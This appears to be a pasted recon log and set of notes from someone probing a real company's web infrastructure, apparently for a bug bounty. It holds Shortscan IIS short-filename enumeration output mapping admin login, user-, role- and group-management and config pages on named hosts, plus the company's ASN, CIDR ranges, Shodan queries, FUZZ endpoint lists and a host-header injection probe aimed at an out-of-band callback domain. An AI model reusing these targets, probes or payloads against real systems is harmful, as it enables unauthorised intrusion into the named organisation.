+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/o/RESOURCES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/o/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+ONENOT~1.JS          ONENOT?.JS 
+ONF6E9~1.JS          ONF6E9?.JS 
+ONE3BF~1.JS          ONE3BF?.JS 
+JQUERY~1.JS          JQUERY?.JS          JQUERY.MIN.JS
+ONC22B~1.JS          ONC22B?.JS 
+ON8A8A~1.JS          ON8A8A?.JS 
+ON5524~1.JS          ON5524?.JS 
+MICROS~1.JS          MICROS?.JS 
+ON81C4~1.JS          ON81C4?.JS 
+RECORD~1.JS          RECORD?.JS 
+ON0E51~1.JS          ON0E51?.JS 
+WEFGAL~1.JS          WEFGAL?.JS 
+WORDED~1.JS          WORDED?.JS 
+WOCDAA~1.JS          WOCDAA?.JS 
+WODFEB~1.JS          WODFEB?.JS 
+WO8E53~1.JS          WO8E53?.JS 
+WO1DEE~1.JS          WO1DEE?.JS 
+WO7BFC~1.JS          WO7BFC?.JS 
+WO6485~1.JS          WO6485?.JS 
+WACAIR~1.JS          WACAIR?.JS 
+WO0A88~1.JS          WO0A88?.JS 
+ONENOT~2.JS          ONENOT?.JS 
+RECORD~2.JS          RECORD?.JS 
+WORDED~2.JS          WORDED?.JS 
+WO213E~1.JS          WO213E?.JS 
+WORDED~4.JS          WORDED?.JS 
+ONENOT~3.JS          ONENOT?.JS 
+ONENOT~4.JS          ONENOT?.JS 
+WORDED~3.JS          WORDED?.JS 
+JQUERY~2.JS          JQUERY?.JS 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 7632; Retries: 0; Sent 1701865 bytes; Received 11332526 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/op
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/op/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+VIEW~1.ASP           VIEW.ASP?           VIEW.ASPX
+EMBED~1.ASP          EMBED.ASP?          EMBED.ASPX
+FILETO~1.HTM         FILETO?.HTM? 
+WRONGF~1.HTM         WRONGF?.HTM? 
+SETTIN~1.INI         SETTIN?.INI? 
+FILENO~1.HTM         FILENO?.HTM?        FILENOTFOUND.HTM
+ERRORP~1.HTM         ERRORP?.HTM?        ERRORPAGE.HTM
+GENERA~1.ASP         GENERA?.ASP?        GENERATE.ASPX
+SERVIC~1.HTM         SERVIC?.HTM? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+RESOUR~1             RESOUR?             RESOURCES
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/op/RESOURCES/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+FAVICO~2.ICO         FAVICO?.ICO? 
+FAVICO~1.ICO         FAVICO?.ICO? 
+FAVICO~3.ICO         FAVICO?.ICO? 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 2133; Retries: 0; Sent 466251 bytes; Received 3217351 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/we
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/we/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+APP_SC~1             APP_SC?             APP_SCRIPTS
+APP_BR~1             APP_BR?    
+OFFICE~1.ASH         OFFICE?.ASH? 
+ONENOT~1.ASH         ONENOT?.ASH? 
+ONENOT~1.ASP         ONENOT?.ASP? 
+O365SH~1.ASH         O365SH?.ASH? 
+PICTUR~1.ASH         PICTUR?.ASH? 
+GETIMA~1.ASH         GETIMA?.ASH?        GETIMAGE.ASHX
+WORDOA~1.ASH         WORDOA?.ASH? 
+WORDED~1.ASP         WORDED?.ASP? 
+WSAUPL~1.ASH         WSAUPL?.ASH? 
+SETTIN~1.INI         SETTIN?.INI? 
+REMOTE~1.ASH         REMOTE?.ASH? 
+RESREA~1.ASH         RESREA?.ASH? 
+FILEUP~1.ASH         FILEUP?.ASH?        FILEUPLOAD.ASHX
+RENAME~1.ASH         RENAME?.ASH? 
+DIAGNO~1.ASH         DIAGNO?.ASH? 
+APPSFO~1.ASH         APPSFO?.ASH? 
+CLIPAR~1.ASH         CLIPAR?.ASH? 
+TEMPLA~1             TEMPLA?             TEMPLATES
+TEMPLA~1.ASH         TEMPLA?.ASH? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+RESOUR~1             RESOUR?             RESOURCES
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/we/RESOURCES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/we/TEMPLATES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/we/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+WACAIR~1.JS          WACAIR?.JS 
+WODFEB~1.JS          WODFEB?.JS 
+WOCDAA~1.JS          WOCDAA?.JS 
+WORDED~1.JS          WORDED?.JS 
+WO8E53~1.JS          WO8E53?.JS 
+WO7BFC~1.JS          WO7BFC?.JS 
+WEFGAL~1.JS          WEFGAL?.JS 
+WO1DEE~1.JS          WO1DEE?.JS 
+WO6485~1.JS          WO6485?.JS 
+MICROS~1.JS          MICROS?.JS 
+WO0A88~1.JS          WO0A88?.JS 
+WO213E~1.JS          WO213E?.JS 
+ONENOT~1.JS          ONENOT?.JS 
+JQUERY~1.JS          JQUERY?.JS          JQUERY.MIN.JS
+ONF6E9~1.JS          ONF6E9?.JS 
+ONC22B~1.JS          ONC22B?.JS 
+ONE3BF~1.JS          ONE3BF?.JS 
+ON5524~1.JS          ON5524?.JS 
+ON8A8A~1.JS          ON8A8A?.JS 
+ONENOT~2.JS          ONENOT?.JS 
+ON81C4~1.JS          ON81C4?.JS 
+ONENOT~3.JS          ONENOT?.JS 
+WORDED~2.JS          WORDED?.JS 
+WORDED~3.JS          WORDED?.JS 
+ON0E51~1.JS          ON0E51?.JS 
+ONENOT~4.JS          ONENOT?.JS 
+WORDED~4.JS          WORDED?.JS 
+JQUERY~2.JS          JQUERY?.JS 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 7245; Retries: 0; Sent 1622085 bytes; Received 10734778 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/oh
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/oh/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+SETTIN~1.INI         SETTIN?.INI? 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 241; Retries: 0; Sent 51640 bytes; Received 349337 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/wv
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/wv/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+APP_SC~1             APP_SC?             APP_SCRIPTS
+APP_BR~1             APP_BR?    
+RESOUR~1             RESOUR?             RESOURCES
+MWORD~1.ASP          MWORD.ASP? 
+REMOTE~1.ASH         REMOTE?.ASH? 
+RESREA~1.ASH         RESREA?.ASH? 
+TEMPLA~1.ASH         TEMPLA?.ASH? 
+MRESRE~2.ASH         MRESRE?.ASH? 
+O365SH~1.ASH         O365SH?.ASH? 
+WSAUPL~1.ASH         WSAUPL?.ASH? 
+WORDCO~1.ASP         WORDCO?.ASP? 
+COMMEN~1.ASH         COMMEN?.ASH? 
+WORDPR~1.ASH         WORDPR?.ASH? 
+WORDVI~1.ASP         WORDVI?.ASP? 
+MRESRE~1.ASH         MRESRE?.ASH? 
+MWORDC~1.ASP         MWORDC?.ASP? 
+GLOBAL~1.ASA         GLOBAL?.ASA? 
+DOCDAT~1.ASH         DOCDAT?.ASH? 
+SETTIN~1.INI         SETTIN?.INI? 
+DIAGNO~1.ASH         DIAGNO?.ASH? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/wv/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+WORDVI~1.JS          WORDVI?.JS 
+WO893F~1.JS          WO893F?.JS 
+WO9D38~1.JS          WO9D38?.JS 
+WACAIR~1.JS          WACAIR?.JS 
+MFCCHE~1.JS          MFCCHE?.JS 
+WO1A76~1.JS          WO1A76?.JS 
+MICROS~1.JS          MICROS?.JS 
+WORDVI~3.JS          WORDVI?.JS 
+WORDVI~4.JS          WORDVI?.JS 
+WORDVI~2.JS          WORDVI?.JS 
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/wv/RESOURCES/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MWORDA~2.CSS         MWORDA?.CSS? 
+MWORDA~1.CSS         MWORDA?.CSS? 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 4715; Retries: 0; Sent 1040726 bytes; Received 7154407 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/en-us
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+https://roadtrips.pilotflyingj.com/RECRUITMENT/JOB_POSTINGS/Error.aspx?ErrorID=b1d30ebd-f015-4230-83ab-bfe0743f95b0&TryAgainURL=https://roadtrips.pilotflyingj.com/RECRUITMENT/JOB_POSTINGS/MANAGEMENT.ASPX?PostingSetupID=
+
+
+https://roadtrips.pilotflyingj.com/RECRUITMENT/JOB_POSTINGS/MANAGEMENT.ASPX?PostingSetupID=
+
+
+
+
+
+
+
+root@x:~# shortscan https://edocs-test.pilotcompany.com:8443
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+ROLE_M~1             ROLE_M?    
+WEB~1.CON            WEB.CON?   
+WEB_NA~1             WEB_NA?    
+USER_M~1             USER_M?    
+WEB_CO~1             WEB_CO?    
+GROUP_~1             GROUP_?    
+DEFINE~1             DEFINE?    
+CONTRO~1             CONTRO?             CONTROLLER
+POPCAL~1             POPCAL?    
+ACKNOW~1.HTM         ACKNOW?.HTM? 
+DSSADM~1.MAS         DSSADM?.MAS? 
+DSSBAS~1.MAS         DSSBAS?.MAS? 
+DISCOV~1.ASP         DISCOV?.ASP? 
+LOGIN~1.ASP          LOGIN.ASP?          LOGIN.ASPX
+DEBENU~1.DLL         DEBENU?.DLL?   DebenuPDFLibraryLite1114.dll DebenuPDFLibraryLite1012.dll DebenuPDFLibrary64DLL1113.dll 
+DEBENU~2.DLL         DEBENU?.DLL? 
+ACCESS~1.ASP         ACCESS?.ASP?        ACCESSDENIED.ASPX
+KEEPAL~1.HTM         KEEPAL?.HTM?        KEEPALIVE.HTM
+LOGOFF~1.ASP         LOGOFF?.ASP?        LOGOFF.ASPX
+LOGINS~1.ASP         LOGINS?.ASP? 
+GLOBAL~1.ASA         GLOBAL?.ASA? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+GENERA~1             GENERA?             GENERATOR
+DEFAUL~2.ASP         DEFAUL?.ASP?        DEFAULT2.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/GENERATOR/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+PRINTV~1             PRINTV?             PRINTVERSION
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/GENERATOR/PRINTVERSION/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+PRINTV~1.ASP         PRINTV?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/CONTROLLER/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+LINKVA~1.ASP         LINKVA?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+PROCES~1.ASP         PROCES?.ASP? 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 4147; Retries: 0; Sent 888969 bytes; Received 7701091 bytes
+root@x:~# shortscan https://edocs-test.pilotcompany.com:8443/WEB_controls/
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/WEB_controls/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+VDOC~1.ASC           VDOC.ASC?  
+SAVEAP~1.ASC         SAVEAP?.ASC? 
+DOC_SE~1.ASC         DOC_SE?.ASC? 
+EMAIL_~1.ASC         EMAIL_?.ASC? 
+USER_S~1.ASC         USER_S?.ASC? 
+PROGRE~1.ASC         PROGRE?.ASC? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 893; Retries: 0; Sent 199241 bytes; Received 1655108 bytes
+root@x:~# shortscan https://edocs-test.pilotcompany.com:8443/USER_FUZZ
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/USER_FUZZ/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 290; Retries: 0; Sent 64845 bytes; Received 566877 bytes
+root@x:~# shortscan https://edocs-test.pilotcompany.com:8443/ROLE_mgmt
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/ROLE_mgmt/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+ROLE_D~1.ASP         ROLE_D?.ASP? 
+ROLE_A~1.ASP         ROLE_A?.ASP? 
+ROLE_N~1.ASP         ROLE_N?.ASP? 
+ROLE_M~1.ASP         ROLE_M?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 367; Retries: 0; Sent 80593 bytes; Received 663641 bytes
+root@x:~# shortscan shortscan https://edocs-test.pilotcompany.com:8443/USER_mgmt
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+FATAL Unable to access server                       error="Get \"https://shortscan/.aspx\": dial tcp: lookup shortscan on 127.0.0.53:53: server misbehaving"
+root@x:~# shortscan https://edocs-test.pilotcompany.com:8443/USER_mgmt
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/USER_mgmt/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+USER_D~2.ASP         USER_D?.ASP? 
+USER_D~1.ASP         USER_D?.ASP? 
+USER_M~1.ASP         USER_M?.ASP? 
+USER_C~2.ASP         USER_C?.ASP? 
+USER_C~1.ASP         USER_C?.ASP? 
+USER_C~3.ASP         USER_C?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 727; Retries: 0; Sent 159651 bytes; Received 1335806 bytes
+root@x:~# shortscan https://edocs-test.pilotcompany.com:8443/GROUP_mgmt
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/GROUP_mgmt/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+GROUP_~2.ASP         GROUP_?.ASP? 
+GROUP_~3.ASP         GROUP_?.ASP? 
+GROUP_~1.ASP         GROUP_?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 681; Retries: 0; Sent 150080 bytes; Received 1254367 bytes
+root@x:~# shortscan https://edocs-test.pilotcompany.com:8443/con/
+
+
+document
+
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/admin/ADMIN_LOGIN.ASPX
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+ADMIN_~1.ASC         ADMIN_?.ASC? 
+ADMIN_~3.ASP         ADMIN_?.ASP?        ADMIN_LOGIN.ASPX
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+ADMIN_~1.ASP         ADMIN_?.ASP? 
+ADMIN_~4.ASP         ADMIN_?.ASP? 
+ADMIN_~2.ASP         ADMIN_?.ASP? 
+════════════════════════════════════════════════════════════════════════════════
+
+
+
+
+
+URL: https://edocs-test.pilotcompany.com:8443/security/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+AUTH_S~1.ASP         AUTH_S?.ASP? 
+DATA_S~1.ASP         DATA_S?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/config/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+ENUMS~1.ASP          ENUMS.ASP? 
+APP_SE~1.ASP         APP_SE?.ASP? 
+DEFINE~2.ASP         DEFINE?.ASP? 
+DEFINE~1.ASP         DEFINE?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/samples/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+1095CS~1.PDF         1095CS?.PDF? 
+HOWTOC~1.PDF         HOWTOC?.PDF? 
+1099MI~1.PDF         1099MI?.PDF? 
+1098TS~1.PDF         1098TS?.PDF? 
+1099IN~1.PDF         1099IN?.PDF? 
+1099DI~1.PDF         1099DI?.PDF? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+
+
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/js/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WZ_TOO~1.JS          WZ_TOO?.JS          WZ_TOOLTIP.JS
+CANCEL~1.JS          CANCEL?.JS 
+JQUERY~2.JS          JQUERY?.JS 
+JQUERY~1.JS          JQUERY?.JS 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/generator/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+PRINTV~1             PRINTV?             PRINTVERSION
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+
+URL: https://edocs-test.pilotcompany.com:8443/generator/PRINTVERSION/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+PRINTV~1.ASP         PRINTV?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/err/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+GENERA~1.ASP         GENERA?.ASP? 
+════════════════════════════════════════════════════════════════════════════════
+
+
+
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/settings/
+Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+CONFIG~2.ASP         CONFIG?.ASP? 
+CONFIG~1.ASP         CONFIG?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/document/vDocument.aspx?documentid=
+
+VDOCUM~1.ASP         VDOCUM?.ASP? 
+VDOCUM~2.ASP         VDOCUM?.ASP?       /vDocument.aspx?documentid=
+HELP_T~1.TXT         HELP_T?.TXT?        help_test.txt
+VIEWDO~1.ASP         VIEWDO?.ASP?        VIEWDOCUMENT.ASPX
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://edocs-test.pilotcompany.com:8443/content/
+
+EDITPA~1.ASP         EDITPA?.ASP?        EDITPAGE.ASPX?redir,uid
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+EDITCO~1.ASP         EDITCO?.ASP?        editcontext.aspx
+════════════════════════════════════════════════════════════════════════════════
+
+Vdocumentation
+vDocumentationCM
+VDocumentAPI
+vDocumentosSolicitados.aspx.cs
+vDocumento
+vDocumento
+
+
+
+https://edocs-test.pilotcompany.com:8443/document/vDocument.aspx?documentid= 
+
+https://edocs-test.pilotcompany.com:8443/document/help_test.txt
+
+--------------------------------------------------------------------------------------------------
+edocs-test.pilotcompany.com\:8443_document_help_test.txt
+
+
+AS14556	ASN	Pilot Travel Centers, LLC
+
+
+cidrs_
+
+65.196.143.0/24
+70.159.149.0/24
+74.114.188.0/24
+74.114.189.0/24
+74.114.190.0/24
+_
+
+
+Scope:
+
+*.pilottravelcenters.com
+*.pilotflyingj.com	
+*.rvpluscard.com
+*.pilotcloud.net	
+*.greenamericabiofuels.com	
+*.pilotcompany.com	
+*.saratogarack.com	
+
+Customer Portal	
+Prime Parking
+com.pilottravelcenters.mypilot	Android.apk
+
+
+
+
+shodan_
+
+org:"Pilot Travel Centers  LLC"
+
+
+200 OK url 
+
+https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK
+https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK
+
+
+_
+
+
+
+
+
+
+
+root@nsr3b:~# shortscan https://ids.rsga.pilotcloud.net
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://ids.rsga.pilotcloud.net/
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+NWEBSE~1             NWEBSE?             NWEBSECCONFIG
+APP_TH~1             APP_TH?    
+WEB~1.CON            WEB.CON?   
+RESOUR~1             RESOUR?             .RESOURCES
+IDEA~1.ASP           IDEA.ASP?  
+ERROR~1.HTM          ERROR.HTM?          ERROR.HTML
+ERROR~1.ASP          ERROR.ASP? 
+IDEASU~1.ASP         IDEASU?.ASP? 
+PRECOM~1.CON         PRECOM?.CON? 
+REPORT~1.ASP         REPORT?.ASP?        REPORTVIEWERWEBFORM.ASPX
+HEALTH~1.ASP         HEALTH?.ASP?        HEALTHE-SHIELD.ASP
+REPORT~2.ASP         REPORT?.ASP?        REPORTSTATUS.ASPX
+EMPLOY~1.ASP         EMPLOY?.ASP?        EMPLOYEEMANAGEMENT.ASPX
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT_COPY%282%29.ASP
+PACKAG~1.CON         PACKAG?.CON? 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 2052; Retries: 0; Sent 413496 bytes; Received 2800915 bytes
+
+https://ids.rsga.pilotcloud.net/EMPLOYEEMANAGEMENT.ASPX
+
+
+
+
+TO_LOOK_MORE
+
+
+https://api.cp.pilotflyingj.com/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/FUZZ
+
+
+
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/blog?query=&
+X-Forwarded-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Forwarded-Server: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+
+
+
+* do google dork and github dork for urls
+
+
+
+
+swagger-api
+
+https://digital-qa-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-dev-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+
+
+
+do sub_brute
+
+
+
+*.rightangle.private.pilotcloud.net
+*.workflowengine-qa.trips.pilotcloud.net	
+
+
+
+https://74.114.188.161/ASPNET_CLIENT/system_web/2_0_50727/
+https://74.114.188.161/ASPNET_CLIENT/SYSTEM_WEB/4_0_30319/
+https://74.114.188.161/commonfiles/OFFLINeimages/APP_OFFLINE.HTM
+
+FUELPA~1             FUELPA?    
+FUELPR~1             FUELPR?    
+RATEPF~1             RATEPF?    
+WEB~1.CON            WEB.CON?   
+RETALI~1             RETALI?    
+EFORMS~1             EFORMS?    
+EVENTR~1             EVENTR?    
+RETAIL~1             RETAIL?    
+EXE13B~1             EXE13B?    
+EXB78E~1             EXB78E?    
+EXTRAN~1             EXTRAN?    
+EX4213~1             EX4213?    
+PFJDOC~1             PFJDOC?    
+PHILAN~1             PHILAN?    
+VENDOR~2             VENDOR?    
+BIODIE~1             BIODIE?    
+BLUEBE~1             BLUEBE?    
+FUELPA~4             FUELPA?    
+FUELPA~3             FUELPA?    
+FUELPA~2             FUELPA?    
+DFSRPR~1             DFSRPR?    
+VENDOR~1             VENDOR?    
+
+DOWN_F~1.JPG         DOWN_F?.JPG? 
+EMPLOY~1             EMPLOY?    
+SURVEY~1             SURVEY?    
+ASPNET~1             ASPNET?             https://74.114.188.161/aspnet_client
+COMMON~1             COMMON?             https://74.114.188.161/commonfiles
